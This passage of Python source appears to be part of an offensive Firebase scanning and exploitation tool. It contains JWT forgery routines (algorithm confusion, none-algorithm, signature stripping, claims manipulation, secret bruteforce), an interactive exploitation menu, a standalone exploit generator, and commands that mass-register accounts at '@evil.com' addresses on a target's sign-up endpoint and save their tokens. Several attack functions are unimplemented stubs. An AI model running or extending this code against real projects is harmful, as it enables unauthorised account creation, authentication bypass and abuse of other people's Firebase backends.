            manipulated_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
            
            return {
                'success': True,
                'details': 'Algorithm confusion attack - RS256 -> HS256',
                'manipulated_token': manipulated_token,
                'original_algorithm': 'RS256',
                'new_algorithm': 'HS256'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'Algorithm confusion failed: {e}'}

    def _display_jwt_analysis(self, analysis: Dict) -> None:
        """Display JWT analysis results"""
        if 'error' in analysis:
            print(f"{Colors.FAIL}[!] JWT Analysis Error: {analysis['error']}{Colors.ENDC}")
            return
        
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║              JWT ANALYSIS                ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}Header:{Colors.ENDC}")
        for key, value in analysis['header'].items():
            print(f"  {key}: {value}")
        
        print(f"\n{Colors.YELLOW}Key Claims:{Colors.ENDC}")
        key_claims = ['email', 'email_verified', 'user_id', 'iss', 'aud', 'sub']
        for claim in key_claims:
            if claim in analysis:
                color = Colors.FAIL if claim == 'email_verified' and not analysis[claim] else Colors.WHITE
                print(f"  {color}{claim}: {analysis[claim]}{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}Timing:{Colors.ENDC}")
        import datetime
        for time_claim in ['issued_at', 'expires_at', 'auth_time']:
            if analysis.get(time_claim):
                timestamp = analysis[time_claim]
                readable_time = datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                print(f"  {time_claim}: {timestamp} ({readable_time})")
        
        print(f"\n{Colors.YELLOW}Security Analysis:{Colors.ENDC}")
        print(f"  Algorithm: {analysis['algorithm']}")
        print(f"  Key ID: {analysis['key_id']}")
        print(f"  Signature Length: {len(analysis['signature'])} chars")
        
        # Identify potential weaknesses
        weaknesses = []
        if analysis['algorithm'] == 'none':
            weaknesses.append("Algorithm 'none' - No signature verification!")
        if analysis['algorithm'].startswith('HS'):
            weaknesses.append("HMAC algorithm - Vulnerable to key confusion attacks")
        if not analysis['email_verified']:
            weaknesses.append("Email not verified - Primary target for manipulation")
        if analysis.get('expires_at', 0) - analysis.get('issued_at', 0) > 86400:
            weaknesses.append("Long token lifetime - Extended attack window")
        
        if weaknesses:
            print(f"\n{Colors.FAIL}Potential Weaknesses:{Colors.ENDC}")
            for weakness in weaknesses:
                print(f"  • {weakness}")

    def _analyze_jwt(self, token: str) -> Dict:
        """Analyze JWT structure and extract information"""
        import base64
        import json
        
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {'error': 'Invalid JWT format'}
            
            # Decode header
            header_padding = '=' * (4 - len(parts[0]) % 4)
            header_data = base64.urlsafe_b64decode(parts[0] + header_padding)
            header = json.loads(header_data)
            
            # Decode payload
            payload_padding = '=' * (4 - len(parts[1]) % 4)
            payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
            payload = json.loads(payload_data)
            
            # Signature (raw)
            signature = parts[2]
            
            return {
                'header': header,
                'payload': payload,
                'signature': signature,
                'raw_parts': parts,
                'algorithm': header.get('alg', 'Unknown'),
                'key_id': header.get('kid', 'Unknown'),
                'issuer': payload.get('iss', 'Unknown'),
                'audience': payload.get('aud', 'Unknown'),
                'subject': payload.get('sub', 'Unknown'),
                'email': payload.get('email', 'Unknown'),
                'email_verified': payload.get('email_verified', False),
                'user_id': payload.get('user_id', 'Unknown'),
                'issued_at': payload.get('iat', 0),
                'expires_at': payload.get('exp', 0),
                'auth_time': payload.get('auth_time', 0)
            }
            
        except Exception as e:
            return {'error': f'JWT analysis failed: {e}'}

    def _test_jwt_manipulation_bypass(self, api_key: str) -> None: # New simplified version
        """Comprehensive test for JWT manipulation, using existing or new user token."""
        print(f"\n{Colors.CYAN}[*] Comprehensive JWT Manipulation Testing{Colors.ENDC}")

        print("1. Test with an existing user's ID Token")
        print("2. Create a new user and use their ID Token for testing")
        choice = input(f"{Colors.BOLD}[+] Select option (1-2): {Colors.ENDC}").strip()

        user_email, id_token = None, None
        if choice == "1":
            id_token = input(f"{Colors.BOLD}[+] Enter existing user's ID Token: {Colors.ENDC}").strip()
            user_email_input = input(f"{Colors.BOLD}[+] Enter corresponding user's email (optional, for context): {Colors.ENDC}").strip()
            user_email = user_email_input if user_email_input else "jwt_test_existing@example.com"
            if not id_token:
                print(f"{Colors.FAIL}[!] ID Token is required for existing user testing.{Colors.ENDC}")
                return
        elif choice == "2":
            # New user creation handled by _test_jwt_manipulation_bypass_existing
            pass
        else:
            print(f"{Colors.FAIL}[!] Invalid option.{Colors.ENDC}")
            return
        
        self._test_jwt_manipulation_bypass_existing(api_key, user_email, id_token)

    def _perform_jwt_tests(self, original_token: str, api_key: str, email: str) -> List[Dict]:
        """Helper function to perform various JWT attack tests."""
        successful_attacks = []
        jwt_analysis = self._analyze_jwt(original_token) # Assumes _analyze_jwt exists
        if 'error' in jwt_analysis:
            print(f"{Colors.FAIL}[!] Could not analyze JWT: {jwt_analysis['error']}{Colors.ENDC}")
            return successful_attacks
        
        self._display_jwt_analysis(jwt_analysis) # Assumes _display_jwt_analysis exists

        # Define JWT attack functions (these are assumed to exist or be added)
        # For this integration, we are focusing on the structure.
        jwt_attack_map = [
            ("Algorithm Confusion (RS256->HS256)", lambda t, a, k, e: self._test_algorithm_confusion(t, a, k, e)),
            ("None Algorithm Attack", lambda t, a, k, e: self._test_none_algorithm(t, a, k, e)),
            ("Signature Stripping", lambda t, a, k, e: self._test_signature_stripping(t, a, k, e)),
            ("Claims Manipulation (Direct Payload)", lambda t, a, k, e: self._test_claims_manipulation(t, a, k, e)),
            ("Weak Secret Bruteforce (if HMAC)", lambda t, a, k, e: self._test_weak_secret_bruteforce(t, a, k, e)),
            # Add other relevant JWT attacks from the original _test_jwt_manipulation_bypass method
            # ("Key Confusion Attack", self._test_key_confusion),
            # ("Public Key Recovery", self._test_public_key_recovery),
            # ("Token Replay Attack", self._test_token_replay),
            # ("Custom Claims Injection", self._test_custom_claims_injection),
            # ("Direct Payload Modification", self._test_direct_payload_modification),
            # ("Header Parameter Injection", self._test_header_injection),
            # ("Cross-JWT Confusion", self._test_cross_jwt_confusion),
            # ("Time-based Attacks", self._test_time_based_attacks),
        ]

        for attack_name, attack_func in jwt_attack_map:
            print(f"\n{Colors.CYAN}[*] Testing: {attack_name}{Colors.ENDC}")
            try:
                result = attack_func(original_token, jwt_analysis, api_key, email)
                if result.get('success'):
                    print(f"{Colors.GREEN}[+] SUCCESS: {attack_name} - {result.get('details', '')}{Colors.ENDC}")
                    attack_data = {'attack': attack_name, 'result': result}
                    successful_attacks.append(attack_data)
                    
                    manipulated_token = result.get('manipulated_token')
                    if manipulated_token:
                        print(f"{Colors.YELLOW}[i] Testing manipulated token...{Colors.ENDC}")
                        # Assumes _test_manipulated_token exists and is appropriate
                        self._test_manipulated_token(manipulated_token, api_key) 
                else:
                    print(f"{Colors.FAIL}[-] FAILED: {attack_name} - {result.get('error', 'No error details')}{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[!] EXCEPTION in {attack_name}: {e}{Colors.ENDC}")
                import traceback
                traceback.print_exc() # For debugging
        
        return successful_attacks

    def _test_jwt_manipulation_bypass_existing(self, api_key: str, user_email: Optional[str] = None, id_token: Optional[str] = None) -> None:
        """Core logic for JWT manipulation testing, using existing or new user token."""
        
        original_id_token_for_cleanup = None # Used if we create a new user

        if not id_token: # Create a new user
            test_email_default = f"jwt_bypass_{int(time.time())}@example.com"
            user_email_input = input(f"{Colors.BOLD}[+] Enter email for new test user (default: {test_email_default}): {Colors.ENDC}").strip()
            user_email = user_email_input if user_email_input else test_email_default
            
            test_password = input(f"{Colors.BOLD}[+] Enter test password (default: JWTBypassPass123!): {Colors.ENDC}").strip()
            if not test_password:
                test_password = "JWTBypassPass123!"

            print(f"\n{Colors.CYAN}[*] Creating user: {user_email} for JWT testing...{Colors.ENDC}")
            user_data = self._create_test_user(user_email, test_password, api_key) # Assumes _create_test_user
            if not user_data or 'idToken' not in user_data:
                print(f"{Colors.FAIL}[!] Could not create test user. Aborting JWT test.{Colors.ENDC}")
                return
            id_token = user_data['idToken']
            original_id_token_for_cleanup = id_token # Store for cleanup
            print(f"{Colors.GREEN}[✓] Test user {user_email} created successfully.{Colors.ENDC}")
            print(f"    ID Token: {id_token[:30]}...{id_token[-10:]}")
        else:
             # Using existing token, user_email should be provided or is a placeholder
            user_email = user_email if user_email else "existing_user@example.com"
            print(f"\n{Colors.CYAN}[*] Using provided ID token for user: {user_email}{Colors.ENDC}")
            print(f"    ID Token: {id_token[:30]}...{id_token[-10:]}")

        # Perform JWT analysis and attacks
        jwt_analysis_initial = self._analyze_jwt(id_token) # Assumes _analyze_jwt
        if 'error' in jwt_analysis_initial:
            print(f"{Colors.FAIL}[!] Could not analyze the provided/created JWT. Aborting.{Colors.ENDC}")
            return
            
        successful_attacks = self._perform_jwt_tests(id_token, api_key, user_email)

        # Summary
        # Assumes _display_jwt_attack_summary exists and is appropriate
        self._display_jwt_attack_summary(successful_attacks, id_token, jwt_analysis_initial)

        # Offer cleanup only if a new user was created as part of this specific test run
        if original_id_token_for_cleanup:
            if input(f"\n{Colors.BOLD}[?] Delete the test user '{user_email}'? (Y/n): {Colors.ENDC}").lower() != 'n':
                if self._delete_test_user(original_id_token_for_cleanup, api_key): # Assumes _delete_test_user
                    print(f"{Colors.GREEN}[✓] Test user {user_email} deleted.{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to delete test user {user_email}.{Colors.ENDC}")

    # Note: _analyze_jwt, _display_jwt_analysis, _test_algorithm_confusion, etc.
    # are assumed to be defined elsewhere in the class or need to be added if they are new.
    # This integration focuses on the main provided functions.

    def _get_target_input(self) -> Optional[str]:
        """Get target from user input"""
        while True:
            print(f"\n{Colors.CYAN}[*] Target Options:{Colors.ENDC}")
            print("1. Firebase Project ID (e.g., my-project-12345)")
            print("2. Firebase App URL (e.g., https://my-app.firebaseapp.com)")
            print("3. Custom domain URL (e.g., https://example.com)")
            
            target = input(f"\n{Colors.BOLD}[+] Enter target: {Colors.ENDC}").strip()
            
            if not target:
                print(f"{Colors.FAIL}[!] Target is required{Colors.ENDC}")
                if input(f"{Colors.WARNING}Try again? (Y/n): {Colors.ENDC}").lower() == 'n':
                    return None
                continue
                
            return target

    def _get_scan_options(self) -> Dict:
        """Get scanning options from user"""
        options = {}
        
        # API Key (optional)
        api_key = input(f"\n{Colors.BOLD}[+] Firebase API Key (optional, for deeper scanning): {Colors.ENDC}").strip()
        if api_key:
            options['api_key'] = api_key
            
        # Scan scope
        print(f"\n{Colors.CYAN}[*] Scan Scope:{Colors.ENDC}")
        print("1. Full scan (all components)")
        print("2. Database only (Realtime DB + Firestore)")
        print("3. Storage only")
        print("4. Authentication only")
        print("5. Custom selection")
        
        scope = input(f"\n{Colors.BOLD}[+] Select scope (1-5): {Colors.ENDC}").strip()
        
        if scope == "2":
            options['scope'] = ['database']
        elif scope == "3":
            options['scope'] = ['storage']
        elif scope == "4":
            options['scope'] = ['auth']
        elif scope == "5":
            print(f"\n{Colors.CYAN}[*] Available Tests:{Colors.ENDC}")
            tests = {
                'database': 'Realtime Database & Firestore',
                'storage': 'Firebase Storage',
                'auth': 'Authentication',
                'functions': 'Cloud Functions',
                'hosting': 'Firebase Hosting',
                'api': 'API Key Security'
            }
            
            for key, desc in tests.items():
                print(f"  {key}: {desc}")
                
            selected = input(f"\n{Colors.BOLD}[+] Select tests (comma-separated): {Colors.ENDC}").strip()
            if selected:
                options['scope'] = [t.strip() for t in selected.split(',') if t.strip() in tests]
        else:
            options['scope'] = ['all']
            
        # Threading
        if input(f"\n{Colors.BOLD}[+] Use multithreading for faster scanning? (Y/n): {Colors.ENDC}").lower() != 'n':
            options['threading'] = True
            
        # Aggressive mode
        if input(f"\n{Colors.BOLD}[+] Enable aggressive mode (more thorough but slower)? (y/N): {Colors.ENDC}").lower() == 'y':
            options['aggressive'] = True
            
        return options

    def _run_scan(self, target: str, options: Dict) -> List[Dict]:
        """Execute the security scan"""
        all_vulnerabilities = []
        
        # Extract Firebase configuration
        if not self._extract_firebase_config(target):
            print(f"{Colors.FAIL}[!] Could not extract Firebase configuration from target{Colors.ENDC}")
            return all_vulnerabilities
            
        # Set API key if provided
        if 'api_key' in options:
            self.api_key = options['api_key']
            
        # Determine what to scan
        scope = options.get('scope', ['all'])
        if 'all' in scope:
            scope = ['database', 'storage', 'auth', 'functions', 'hosting', 'api']
            
        print(f"\n{Colors.CYAN}[*] Starting Firebase Security Scan{Colors.ENDC}")
        print(f"Target: {target}")
        print(f"Project ID: {self.project_id}")
        print(f"Scope: {', '.join(scope)}")
        
        # Define scan functions
        scan_functions = {
            'database': [self._test_realtime_database, self._test_firestore],
            'storage': [self._test_storage],
            'auth': [self._test_authentication],
            'functions': [self._test_cloud_functions],
            'hosting': [self._test_hosting],
            'api': [self._test_api_keys]
        }
        
        # Execute scans
        if options.get('threading', True):
            # Multithreaded scanning
            import concurrent.futures
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                futures = []
                
                for component in scope:
                    if component in scan_functions:
                        for scan_func in scan_functions[component]:
                            futures.append(executor.submit(scan_func))
                            
                for future in concurrent.futures.as_completed(futures):
                    try:
                        vulnerabilities = future.result()
                        all_vulnerabilities.extend(vulnerabilities)
                    except Exception as e:
                        print(f"{Colors.WARNING}[!] Scan error: {e}{Colors.ENDC}")
        else:
            # Sequential scanning
            for component in scope:
                if component in scan_functions:
                    for scan_func in scan_functions[component]:
                        try:
                            vulnerabilities = scan_func()
                            all_vulnerabilities.extend(vulnerabilities)
                        except Exception as e:
                            print(f"{Colors.WARNING}[!] Error in {scan_func.__name__}: {e}{Colors.ENDC}")
                            
        return all_vulnerabilities

    def _generate_report(self, vulnerabilities: List[Dict]) -> None:
        """Generate a detailed security report with exploitation options"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║              SECURITY REPORT             ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not vulnerabilities:
            print(f"\n{Colors.GREEN}[✓] No vulnerabilities found - Firebase appears to be properly configured!{Colors.ENDC}")
            return
            
        # Group by severity
        critical = [v for v in vulnerabilities if v['severity'] == 'CRITICAL']
        high = [v for v in vulnerabilities if v['severity'] == 'HIGH']
        medium = [v for v in vulnerabilities if v['severity'] == 'MEDIUM']
        low = [v for v in vulnerabilities if v['severity'] == 'LOW']
        
        print(f"\n{Colors.BOLD}Summary:{Colors.ENDC}")
        print(f"  🔴 Critical: {len(critical)}")
        print(f"  🟠 High: {len(high)}")
        print(f"  🟡 Medium: {len(medium)}")
        print(f"  🔵 Low: {len(low)}")
        print(f"  📊 Total: {len(vulnerabilities)}")
        
        # Check for exploitable vulnerabilities
        exploitable_vulns = [v for v in vulnerabilities if v['type'] in ['Unrestricted User Registration', 'Open Realtime Database', 'Database Write Access']]
        
        if exploitable_vulns:
            print(f"\n{Colors.FAIL}🚨 EXPLOITABLE VULNERABILITIES FOUND! 🚨{Colors.ENDC}")
            print(f"   {len(exploitable_vulns)} vulnerabilities can be exploited immediately")
        
        # Detailed findings
        for severity, vulns, color in [
            ('CRITICAL', critical, Colors.FAIL),
            ('HIGH', high, Colors.WARNING),
            ('MEDIUM', medium, Colors.YELLOW),
            ('LOW', low, Colors.CYAN)
        ]:
            if vulns:
                print(f"\n{color}{'='*50}")
                print(f"{severity} SEVERITY FINDINGS")
                print(f"{'='*50}{Colors.ENDC}")
                
                for i, vuln in enumerate(vulns, 1):
                    print(f"\n{color}[{i}] {vuln['type']}{Colors.ENDC}")
                    print(f"URL: {vuln['url']}")
                    print(f"Description: {vuln['description']}")
                    print(f"Impact: {vuln['impact']}")
                    if 'evidence' in vuln:
                        print(f"Evidence: {vuln['evidence'][:100]}...")
                    if 'exploitation' in vuln:
                        print(f"{Colors.RED}Exploit: {vuln['exploitation'][:100]}...{Colors.ENDC}")
        
        # Exploitation menu
        if exploitable_vulns:
            print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
            print(f"║           EXPLOITATION MENU              ║")
            print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
            
            reg_vulns = [v for v in exploitable_vulns if 'Registration' in v['type']]
            db_vulns = [v for v in exploitable_vulns if 'Database' in v['type']]
            
            if reg_vulns:
                print(f"\n{Colors.YELLOW}[!] User Registration Exploits Available{Colors.ENDC}")
                if input(f"{Colors.BOLD}[?] Launch user registration exploitation? (y/N): {Colors.ENDC}").lower() == 'y':
                    # Use the first registration vulnerability
                    vuln = reg_vulns[0]
                    self._exploit_user_registration(vuln['url'], self.api_key)
            
            if db_vulns:
                print(f"\n{Colors.YELLOW}[!] Database Exploits Available{Colors.ENDC}")
                print("   Manual exploitation recommended for database vulnerabilities")
                for vuln in db_vulns:
                    print(f"   • {vuln['url']}")
        
        # Save report to file
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"firebase_scan_{self.project_id}_{timestamp}.json"
            
            report_data = {
                'timestamp': timestamp,
                'project_id': self.project_id,
                'api_key': self.api_key[:10] + '...' if self.api_key else None,
                'summary': {
                    'total': len(vulnerabilities),
                    'critical': len(critical),
                    'high': len(high),
                    'medium': len(medium),
                    'low': len(low),
                    'exploitable': len(exploitable_vulns)
                },
                'vulnerabilities': vulnerabilities
            }
            
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
                
            print(f"\n{Colors.GREEN}[✓] Report saved to: {filename}{Colors.ENDC}")
            
        except Exception as e:
            print(f"\n{Colors.WARNING}[!] Could not save report: {e}{Colors.ENDC}")

    def run_guided(self) -> None:
        """Interactive guided mode for Firebase scanning"""
        self._show_banner()

        while True:
            try:
                print(f"\n{Colors.CYAN}[*] Firebase Security Assessment{Colors.ENDC}")
                
                # Get target
                target = self._get_target_input()
                if not target:
                    break
                    
                # Get scan options
                options = self._get_scan_options()
                
                # Show configuration
                print(f"\n{Colors.CYAN}[*] Scan Configuration{Colors.ENDC}")
                print(f"{Colors.CYAN}=" * 40)
                print(f"Target: {target}")
                if 'api_key' in options:
                    print(f"API Key: {options['api_key'][:10]}...")
                print(f"Scope: {', '.join(options.get('scope', ['all']))}")
                print(f"Threading: {'Yes' if options.get('threading') else 'No'}")
                print(f"Aggressive: {'Yes' if options.get('aggressive') else 'No'}")
                
                # Confirm and execute
                if input(f"\n{Colors.BOLD}[+] Start scan? (Y/n): {Colors.ENDC}").lower() != 'n':
                    vulnerabilities = self._run_scan(target, options)
                    self._generate_report(vulnerabilities)
                    
                    if vulnerabilities:
                        print(f"\n{Colors.WARNING}[!] Security issues found! Review the report above.{Colors.ENDC}")
                    else:
                        print(f"\n{Colors.GREEN}[✓] No security issues detected.{Colors.ENDC}")

                # Ask for another scan
                if input(f"\n{Colors.BOLD}[?] Scan another target? (y/N): {Colors.ENDC}").lower() != 'y':
                    break

            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.ENDC}")
                break
            except Exception as e:
                print(f"{Colors.FAIL}[!] Unexpected error: {e}{Colors.ENDC}")
                import traceback
                traceback.print_exc()

    def run_direct(self) -> None:
        """Direct command execution mode"""
        self._show_banner()
        
        print(f"\n{Colors.CYAN}[*] Direct Mode - Firebase Security Commands{Colors.ENDC}")
        print(f"\n{Colors.CYAN}[*] Available Commands:{Colors.ENDC}")
        print("  scan <project-id>                    - Quick scan of project")
        print("  scan <url>                           - Scan Firebase app URL")
        print("  scan <target> --api-key <key>        - Scan with API key")
        print("  scan <target> --database-only        - Database scan only")
        print("  scan <target> --storage-only         - Storage scan only")
        print("  scan <target> --auth-only            - Authentication scan only")
        print("  scan <target> --aggressive           - Aggressive scan mode")
        print("  exploit <project-id> <api-key>       - Launch exploitation menu")
        print("  create-user <email> <password>       - Create single user (requires scan first)")
        print("  bulk-users <count>                   - Create multiple users")
        print("  generate-exploit                     - Generate standalone exploit script")
        print("  extract <url>                        - Extract Firebase config from URL")
        print("  help                                 - Show help")
        print("  examples                             - Show usage examples")
        print("  exit                                 - Exit to main menu")
        
        while True:
            try:
                command_input = input(f"\n{Colors.BOLD}firebase-scanner > {Colors.ENDC}").strip()
                
                if not command_input:
                    continue
                    
                if command_input.lower() == 'exit':
                    break
                    
                elif command_input.lower() == 'help':
                    help_info = self.get_help()
                    print(f"\n{Colors.CYAN}=== Firebase Scanner Help ==={Colors.ENDC}")
                    print(f"Description: {help_info['desc']}")
                    print(f"\nFeatures:")
                    for feature, desc in help_info['features'].items():
                        print(f"  • {feature}: {desc}")
                    print(f"\nNotes:")
                    for note in help_info['notes']:
                        print(f"  • {note}")
                
                elif command_input.lower() == 'examples':
                    print(f"\n{Colors.CYAN}[*] Usage Examples:{Colors.ENDC}")
                    examples = [
                        ('Basic project scan', 'scan my-firebase-project'),
                        ('Scan with API key', 'scan my-project --api-key AIzaSyBv...'),
                        ('Database-only scan', 'scan https://my-app.firebaseapp.com --database-only'),
                        ('Full exploitation', 'exploit my-project AIzaSyBv...'),
                        ('Create single user', 'create-user hacker@evil.com MyPassword123!'),
                        ('Create 10 users', 'bulk-users 10'),
                        ('Generate exploit script', 'generate-exploit'),
                        ('Extract config', 'extract https://example.com')
                    ]
                    
                    for i, (title, cmd) in enumerate(examples, 1):
                        print(f"\n{Colors.GREEN}{i}. {title}{Colors.ENDC}")
                        print(f"   {cmd}")
                
                elif command_input.startswith('exploit '):
                    parts = command_input[8:].split()
                    if len(parts) >= 2:
                        project_id = parts[0]
                        api_key = parts[1]
                        
                        # Set the project details
                        self.project_id = project_id
                        self.api_key = api_key
                        
                        # Launch exploitation menu
                        endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
                        self._exploit_user_registration(endpoint, api_key)
                    else:
                        print(f"{Colors.FAIL}[!] Usage: exploit <project-id> <api-key>{Colors.ENDC}")
                
                elif command_input.startswith('create-user '):
                    parts = command_input[12:].split()
                    if len(parts) >= 2 and self.api_key:
                        email = parts[0]
                        password = parts[1]
                        endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
                        
                        user_data = {
                            "email": email,
                            "password": password,
                            "returnSecureToken": True
                        }
                        
                        try:
                            response = self.session.post(endpoint, json=user_data, timeout=10)
                            if response.status_code == 200:
                                user_info = response.json()
                                print(f"{Colors.GREEN}[✓] User created: {email}{Colors.ENDC}")
                                print(f"    User ID: {user_info.get('localId', 'Unknown')}")
                                
                                # Save credentials
                                creds_file = f"firebase_user_{user_info.get('localId', 'unknown')}.json"
                                with open(creds_file, 'w') as f:
                                    json.dump({
                                        "email": email,
                                        "password": password,
                                        "user_id": user_info.get('localId'),
                                        "id_token": user_info.get('idToken'),
                                        "created_at": time.time()
                                    }, f, indent=2)
                                print(f"[✓] Credentials saved to: {creds_file}")
                            else:
                                print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
                        except Exception as e:
                            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Usage: create-user <email> <password>{Colors.ENDC}")
                        print(f"{Colors.WARNING}[!] Run a scan first to get API key{Colors.ENDC}")
                
                elif command_input.startswith('bulk-users '):
                    parts = command_input[11:].split()
                    if parts and self.api_key:
                        try:
                            count = int(parts[0])
                            if count > 50:
                                print(f"{Colors.WARNING}[!] Limiting to 50 users for safety{Colors.ENDC}")
                                count = 50
                            
                            endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
                            timestamp = int(time.time())
                            created_users = []
                            
                            print(f"{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")
                            
                            for i in range(count):
                                email = f"bulk{timestamp}_{i}@evil.com"
                                password = f"BulkPass{i}123!"
                                
                                user_data = {
                                    "email": email,
                                    "password": password,
                                    "returnSecureToken": True
                                }
                                
                                try:
                                    response = self.session.post(endpoint, json=user_data, timeout=5)
                                    if response.status_code == 200:
                                        user_info = response.json()
                                        created_users.append({
                                            "email": email,
                                            "password": password,
                                            "user_id": user_info.get('localId'),
                                            "id_token": user_info.get('idToken')
                                        })
                                        print(f"{Colors.GREEN}[✓] {email}{Colors.ENDC}")
                                    else:
                                        print(f"{Colors.FAIL}[✗] {email} - {response.status_code}{Colors.ENDC}")
                                except Exception as e:
                                    print(f"{Colors.FAIL}[✗] {email} - {e}{Colors.ENDC}")
                                
                                time.sleep(0.5)  # Rate limiting
                            
                            # Save all users
                            if created_users:
                                bulk_file = f"firebase_bulk_{timestamp}.json"
                                with open(bulk_file, 'w') as f:
                                    json.dump(created_users, f, indent=2)
                                print(f"\n{Colors.GREEN}[✓] Created {len(created_users)} users{Colors.ENDC}")
                                print(f"[✓] Saved to: {bulk_file}")
                            
                        except ValueError:
                            print(f"{Colors.FAIL}[!] Invalid count{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Usage: bulk-users <count>{Colors.ENDC}")
                        print(f"{Colors.WARNING}[!] Run a scan first to get API key{Colors.ENDC}")
                
                elif command_input.lower() == 'generate-exploit':
                    if self.project_id and self.api_key:
                        endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
                        self._generate_exploit_script(endpoint, self.api_key)
                    else:
                        print(f"{Colors.FAIL}[!] Run a scan first to get project details{Colors.ENDC}")
                
                elif command_input.startswith('extract '):
                    url = command_input[8:].strip()
                    if url:
                        print(f"{Colors.CYAN}[*] Extracting Firebase config from: {url}{Colors.ENDC}")
                        if self._extract_firebase_config(url):
                            print(f"Project ID: {self.project_id}")
                            if self.api_key:
                                print(f"API Key: {self.api_key[:10]}...")
                            if self.database_url:
                                print(f"Database URL: {self.database_url}")
                        else:
                            print(f"{Colors.FAIL}[!] Could not extract Firebase config{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] URL required{Colors.ENDC}")
                
                elif command_input.startswith('scan '):
                    parts = command_input[5:].split()
                    if not parts:
                        print(f"{Colors.FAIL}[!] Target required{Colors.ENDC}")
                        continue
                        
                    target = parts[0]
                    options = {'scope': ['all']}
                    
                    # Parse options
                    i = 1
                    while i < len(parts):
                        if parts[i] == '--api-key' and i + 1 < len(parts):
                            options['api_key'] = parts[i + 1]
                            i += 2
                        elif parts[i] == '--database-only':
                            options['scope'] = ['database']
                            i += 1
                        elif parts[i] == '--storage-only':
                            options['scope'] = ['storage']
                            i += 1
                        elif parts[i] == '--auth-only':
                            options['scope'] = ['auth']
                            i += 1
                        elif parts[i] == '--aggressive':
                            options['aggressive'] = True
                            i += 1
                        else:
                            i += 1
                    
                    # Execute scan
                    print(f"{Colors.CYAN}[*] Starting scan of: {target}{Colors.ENDC}")
                    vulnerabilities = self._run_scan(target, options)
                    self._generate_report(vulnerabilities)
                    
                else:
                    print(f"{Colors.FAIL}[!] Unknown command. Type 'help' for available commands.{Colors.ENDC}")
                    
            except KeyboardInterrupt:
                print()
                continue
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")

    def check_installation(self) -> bool:
        """Check if module dependencies are available"""
        try:
            import requests
            import json
            import re
            return True
        except ImportError:
            return False

    def _get_install_command(self, pkg_manager: str) -> List[str]:
        """Return installation commands for different package managers"""
        commands = {
            'apt': [
                "apt-get update",
                "apt-get install -y python3 python3-pip",
                "pip3 install requests"
            ],
            'yum': [
                "yum update -y",
                "yum install -y python3 python3-pip",
                "pip3 install requests"
            ],
            'dnf': [
                "dnf update -y",
                "dnf install -y python3 python3-pip",
                "pip3 install requests"
            ],
            'pacman': [
                "pacman -Sy",
                "pacman -S python python-pip --noconfirm",
                "pip install requests"
            ]
        }
        return commands.get(pkg_manager, [])

    def _get_update_command(self, pkg_manager: str) -> List[str]:
        """Return update commands"""
        return ["pip3 install --upgrade requests"]

    def _get_uninstall_command(self, pkg_manager: str) -> List[str]:
        """Return uninstallation commands"""
        return ["pip3 uninstall requests -y"]

    def _test_key_confusion(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test key confusion attacks"""
        return {'success': False, 'error': 'Key confusion attack not implemented'}

    def _test_public_key_recovery(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test public key recovery attacks"""
        return {'success': False, 'error': 'Public key recovery not implemented'}

    def _test_token_replay(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test token replay attacks"""
        return {'success': False, 'error': 'Token replay attack not implemented'}

    def _test_custom_claims_injection(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test custom claims injection"""
        return {'success': False, 'error': 'Custom claims injection not implemented'}

    def _test_header_injection(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test header parameter injection"""
        return {'success': False, 'error': 'Header injection not implemented'}

    def _test_cross_jwt_confusion(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test cross-JWT confusion attacks"""
        return {'success': False, 'error': 'Cross-JWT confusion not implemented'}

    def _test_time_based_attacks(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test time-based JWT attacks"""
        return {'success': False, 'error': 'Time-based attacks not implemented'}

# For backward compatibility
def get_tool():
    """Legacy function to get tool instance"""
    return FirebaseScannerModule()

if __name__ == "__main__":
    tool = FirebaseScannerModule()
    
    if len(sys.argv) > 1 and sys.argv[1] == "direct":
        tool.run_direct()
    else:
        tool.run_guided()